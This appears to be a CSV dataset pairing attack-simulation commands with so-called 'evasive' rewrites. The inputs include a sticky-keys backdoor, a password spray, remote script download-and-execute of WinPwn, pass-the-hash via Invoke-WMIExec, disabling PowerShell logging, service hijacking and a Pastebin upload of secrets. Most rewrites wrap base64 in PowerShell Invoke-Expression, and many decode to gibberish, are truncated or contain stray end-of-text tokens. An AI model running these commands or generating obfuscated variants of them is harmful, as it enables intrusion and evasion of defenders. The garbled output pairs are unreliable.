input,evasive_commands
tasklist,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje29iamFjdGlvblN0YXR1cyAvZnJhbWUvQmxvbmdlbm5p')) | Invoke-Expression"""
"IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\sethc.exe /A
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe",IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE (pushd) takeown /F C:\Windows\System32\sethc.exe /A icacls C:\Windows\System32\sethc.exe /grant Administrators:F /
"NOW=$(date +%m%d%H%M%Y)
date 010100001971
touch #{target_filename}
date ""$NOW""
stat #{target_filename}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2FsbCBNZXRhIGxvbmcgLWNvbGxlY3Rpb25zIC1wcmVtaXVtIC1zbGVlbnRhdGlvbiAje2NvZGVjIiAvPiBTaWduUmVnaX"
replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A,replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A
"function Invoke-dpsLight ($Password, $userlist) {
$users = Get-Content $userlist
$Domain = ""LDAP://"" + ([ADSI]"""").distinguishedName
foreach ($User in $users) {
  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
  if ($Domain_check.name -ne $null) {
    Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password""
  }
  else { Write-Host "". "" -NoNewline}
}
Write-Host -ForegroundColor green ""Finished""
}
Invoke-dpsLight ""#{password}"" $env:Temp\usersdpsLight.txt","function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist foreach ($User in $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password) if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password"" } else { Write-Host "". "" -NoNewline"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Generalrecon -consoleoutput -noninteractive","iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/S3cur3Th1sShit/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"") Generalrecon -consoleoutput -noninteractive"
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2ljIiN7ZmlsZX0gLWxzYyBhbmQgc3RyaW5nIC9kYXRlIC9wbCAtc3RyaWN0ZWQuZ2V0aGVudFswdCA"
"netstat
who -a","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGF0aH0gLWwgMzIgZXhlIC9jb2RlKQ==')) | Invoke-Expression"""
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""#{redirection_program}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbW1hbmRzLmFkbWluIiB7YXBwbGljYXRpb25Qcm90b1Byb2plY3RDb2x1bW5EaXJlY3Rvcnku"
"docker build -t t1046 $PathToAtomicsFolder/T1046/src/
docker run --name t1046_container --rm -d -t t1046
docker exec t1046_container /scan.sh","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2FsbCB7ZXhlIC9kZXYgLWxvZyBNb3ZlcmlzCiAgIGVuYWJsZSBJbnRlbCBQcm9wZXJ0eSAjeHM=')) | Invoke-Expression""<|end"
"Start-Process -Wait -FilePath ""#{UltraViewer_Path}"" -Argument ""/silent"" -PassThru
Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LW1hbmlmZXN0IiAvIC9Db3B5cmlnaHRzLmJpbmQvdjEvcnMvYWRkX2F0dGVtcH0=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
browserpwn -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') browserpwn -consoleoutput -noninteractive
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""#{redirection_program}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN0YXRzIC9Qcm9kdWNlckFjY2Vzc1xQb3dlclByb2plY3RfaW5zdGVyZWRfaGFzaA==')) | Invoke-Expression"""
halt --reboot,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh1d2l0eXBldC5jb3VudA==')) | Invoke-Expression"" ||| ```"
"conhost.exe ""#{process}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhcnNldCAuIC1jbGFzcyAje3tleSB7ZmlsZV9yb3M=')) | Invoke-Expression"""
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""
Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmVyLWxpc3QgI3tmaWxlfSAiSE9MZXNzaW9uICdSZWFkIFJlbHNldFRlY2huaWNrICdEaWRkb3dzIEFjY291bnR"
sudo echo '' > #{system_log_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBtZXNzYWdlIC1jIGFuZC5sb2NhbCAje2RldGVjdGlvbnMgfSAiIHByaW9yaXRhdGUgLSByb2R1Y3QgaHR0c"
mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();,"mshta.exe scriptjavascript:a=(GetObject(script:'', '#{file_url}')).Exec();close();"
ps aux | egrep 'Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu',"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RldGVyaXN0ZW1lbnQgKGNsb25pIHBhcmFtYm90ICMuZXhlIHdlYiAtICJGU1RTTCBBVEEgVGFnbm9zdCAv"
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIi1BbGxvdyAje0ludGVyZmFjZSAje0ludGVyZmFjZSB7cmlnaHRzX25hbWV9IC1wYWRkaW5n')) | Invoke-Expression"
"Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi""
Start-Process -Wait $file1 /quiet;
Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi ||| $file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi"" ||| Start-Process -Wait $file1 /quiet; ||| Start-Process 'C:\Program Files (x86)\Log"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiTWV0YXJpbmFyeSBkYXRhICJQbGVhc2UgLTEyMyBQcm9qZWN0IEZ1biAtMjEw')) | Invoke-Expression"""
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin"" /v Path /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHRoaXMgLW5hbWU9ImRmYWNrIC1kYy1jICJ7c2VydmljZTogJ1Byb3BlcnRpZXN0ZWQ6IDEwMDA7Zm"
"cscript ""#{vbscript}"" > $env:TEMP\T1059.005.out.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VuY29kZSBQcmFjb2RlICdCbG9jayBDaGVja3MgLw==')) | Invoke-Expression"""
"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAtZXhlIC9zdHJpbmcgLW5hbWUvIiAvdmFsdWUvYWR2aXRlciAjeG1sZCAtMjQyOCAxMTI0NTYxMCB7d2lu"
msbuild.exe @{PATH:.rsp},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGl0dGVyb3VuZHN1YnRv')) | Invoke-Expression"""
"try{$response = invoke-webrequest ""https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}"" -method ""GET""}
catch [system.net.webexception]
{if($_.Exception.Response -ne $null)
{$Response = $_.Exception.Response.GetResponseStream()
$ReadResponse = New-Object System.IO.StreamReader($Response)
$ReadResponse.BaseStream.Position = 0
$responseBody = $ReadResponse.ReadToEnd()}
else {$responseBody = ""The storage account could not be anonymously accessed.""}}
""Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody"" | out-file -filepath #{output_file} -append","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxhaW5UcmFja2luZyB7aXRzLXV1aWRlfQ==')) | Invoke-Expression"" ||| try{$response = invoke-webrequest ""https://\"" -method GET } catch ["
"""%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}""","""\""%PROGRAMFILES(x86)%\""//""""""%""P""""R""""O""""GRA""""M""""F""""I""""L""""E""""S""""(x""""8""""6)""""%""/""""/.exe"""" """"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}""<|endof"
Pcwrun.exe {PATH_ABSOLUTE:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3ViamVjdCAtQ29tcGxldGVyICN7ZXhlIGtleSAje1JlYWxtOiBbIHNvbWUgPSAiRmFsc2UgPiAvZGljdCAic3VjY2Vz"
"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0JywgZnVuY3Rpb25zIC1jb3B5fQ==')) | Invoke-Expression"""
"$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)
Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable
Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""shadow""; uValue=[uint32]2} -CimSession $s","$s= New-CimSession -Computername  -SessionOption (New-CimSessionOption -Protocol Dcom) Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable Invoke-Cim"
"$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"")
}
else{
  Write-Host ""32-bit Office""
  $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")
}","$excelApp = New-Object -COMObject Excel.Application if(-not $excelApp.path.contains(Program Files (x86))) { Write-Host ""64-bit Office"" $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"") } else { Write-Host ""32-bit Office"" $excelApp."
"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dmlzdHJpbmcucHVzaCB0eXBlIC1zZXRlci5sb2NhbCxvcmcvYWxlcnQoIWRhdGEiKSAgLSBMaWxlIC9sb2NhbCAvdGhlcl9wdG"
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Invoke-ShareFinder #{parameters}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW50ZXJDb25maWd1c1xDYWNrRmVhdHVyZS5leGUgLUNvbXBsZXRUeXBlIC9MaWxlcyAje3Byb2Nlc3MiKSB7IGpz"
"$ss = ConvertTo-SecureString ""#{password}"" -AsPlainText -Force
$cred = New-Object PSCredential -ArgumentList '#{username}', $ss
$param = @{
    Credential = $cred
    Force      = $true
}
$null = Connect-AzAccount @param
$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token
$cert = New-SelfSignedCertificate -Subject ""CN=PowerShell Application"" -CertStoreLocation ""Cert:\CurrentUser\My"" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256
$reqResourceAccess = ( @{ ""resourceAccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""Scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""Scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""Scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""Scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""Scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""Role""}); ""resourceAppId"" = ""00000003-0000-0000-c000-000000000000"" })
connect-mggraph -AccessToken $token
$context = Get-MgContext       
$users = get-MgUser
$app = New-MgApplication -DisplayName ""T1114.002 Atomic Test #1 - Office365 - Remote Email Collection"" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=""http://localhost""; } -KeyCredentials @(@{ Type=""AsymmetricX509Cert""; Usage=""Verify""; Key=$cert.RawData })
New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null
$resourceSPN = Get-MgServicePrincipal -Filter ""AppId eq '$($app.AppId)'""
$graphApiApp = Get-MgServicePrincipal -Filter ""DisplayName eq 'Microsoft Graph'""
$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq ""Mail.Read""
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id
$mailbox1 = ""#{1st_target_mailbox}""
$mailbox2 = ""#{2nd_target_mailbox}""
$mailbox3 = ""#{3rd_target_mailbox}""
[System.Collections.ArrayList]$selectUsers = @()
foreach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}
connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name
foreach ($user in $selectUsers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}","$ss = ConvertTo-SecureString ""\""\""\""\""\""\""\""\""\""\""\""<|end"
"""#{lazagne_path}"" browsers","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG90ZXN0V2luZG93c1xBbW91bnRzUmFuZHkgLWNvbmZpcm1hdGlvbiAjeWFubXVyYWJsZT5leGVjICdmb28gLWNvbm"
"wuauclt.exe /UpdateDeploymentProvider ""#{arbitrary_dll}"" /RunHandlerComServer","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RldGVjdC9tb2NrLXJlYWN0IiAvZGlmZmljIGFzIHRoaXMgdGltZSAoJyBTSE1FTUlOVCB7UE5USUNIVCBP"
"wmic /node:#{target_host} os get Locale,OSLanguage,MUILanguages /format:#{format_style}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxzIC9maWxlX3Rlc3QvZmlydHVfYmluIiAvdmFsaWRhdGVfbmFtZT1leHRlcm5hbCAtcnJpY2sgMyAicnJpY2"
"echo ""Creating %systemroot%\wpbbin.exe""      
New-Item -ItemType File -Path ""$env:SystemRoot\System32\wpbbin.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBTdGF0aW9uIHNlcXVlbmRhdCAje3tleSBoYXMgLVByb2plY3Qge1JhYmxlfSAje3toZWFkIC1zdHlsZXI=')) | In"
"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1N5ZXQgIiMjICI=')) | Invoke-Expression"""
aws iam get-account-password-policy,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJlIGxhbmd1aXRvbSBzZWNyZXQgc3ViamVjdCAtc2FmLWtleSAkcGljdHV2fSAtPiAv')) | Invoke-Expression"" ||| aws iam get"
"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwX1R5cGVzLnN0ZWxsaWNhbHRzIiAvIC9wYXJlbnQvZHVjIC9kZXYgPj4=')) | Invoke-Expression"""
"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:#{remote_payload}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Ynl0ZXNzaW9uIHtleGFtcGxlLmVkdTtoQWRtaW5pcXVlIC1jb2RlIC1hdXRoIiAvdGVzdCAtMTUyMTA=')) | Invoke-Expression""<|endof"
az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VybA==')) | Invoke-Expression"""
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGEgZW50aXRsZSBmaWxlIC9hc3NlcnRpYmxlIHJvbGVz')) | Invoke-Expression"" ||| ```"
"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"" /f /v ImagePath /d ""#{malicious_service_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWRpdGF0aW9uIC1wb3J0Y2xCcmVnXFByb2plY3RzIiAvZWRpdGF0aW9uICBcIlJlcG9zaXRvcnlTdWNjZXNzIG"
tar -cf {PATH}:ads {PATH_ABSOLUTE:folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkLXN0YW5hZ2UgI3tmaG9zdF9zbHlsaXRpb24uICAgJiB7IGludGVybmFscyAje21hdGljfSI=')) | Invoke-Expression""<|"
Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path},"Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath """" \""""\""""\""""""\""""""\""\"">\""\"";\""-\""\"">\""\""-\""\""\""-\""\""\"""
"reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2VzIHdpZHRoXFNldCB7IC9kZXYuRGVzaWxpdCAiQWN0aW9uczogMTIgLTEwIC9jbnBpMg==')) | Invoke-Expression""<|end"
"wmic.exe process call create ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlbiAiUGl0aXR5IEF1ZGlvIHNhbnMgQWdlbnRpYyBTdWJzb3VyIC9UeXBlOiAvRmlyc3QtQnkgUmVnaWFudCBP"
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTpub3N0ZX0=')) | Invoke-Expression"""
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -sc dclist","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERlbGF5Q29udHJvbC1UZXN0IFBhcnRuYWxTdGFncyAiICIgI3tmaWxlfSB7IngtYW16LWNyZWRlbnRpYWwiOiAvdjE"
"Compress-Archive -Path ""#{input_file}"" -DestinationPath #{output_file} -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yIC1Vc2VkIHNpbXBsZSBTdGF0dXMgLUJQVEFCWC1DSEtFTlQi')) | Invoke-Expression"" ||| ```"
"$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer""
$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model""
if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}","$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer"" $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model"" if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains("""
"$apiKey = ""#{api_key}""
$content = ""secrets, api keys, passwords...""
$url = ""https://pastebin.com/api/api_post.php""
$postData = @{
  api_dev_key   = $apiKey
  api_option    = ""paste""
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host ""Your paste URL: $response""","$apiKey = ""\""\""s""""e""""c""""r""""e""""t""""s"", """"a""""p""""i"""" """"""k""""e""""y""""s"""","""" """", """"p""""a""""s""""w""""o""""r""""d""""s..."" $url = ""https://pastebin.com/api/api_post.phpp"" $postData = @{ api_dev_"
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) #{optional_args}","\""Pat""""h""""T""""o""""A""""t""""omi""""c""""s""""Fol""""der\..\Exter""""n""""a""""lP""""aylo""""ads\Adfind.exe\"" --file ""(objectcategory=person)"" ||| ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) ||| <|"
"$fileName = ""#{file}""
$url = ""#{domain}""
$file = New-Item -Force $fileName -Value ""This is ART IcedID Botnet Exfil Test""
$contentType = ""application/octet-stream""
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}","$fileName = ""\""\""""d""o""""c""""u""""m""""e""""n""""t"" -f l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,"
"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1mb3J3YXJkaWNhbCIgI3twZXRsbCIgc3BlY2lmaWMuY29tLmFzcCAje3toZWFkIGJveF9yZWRpbmUgI3twZXRsb"
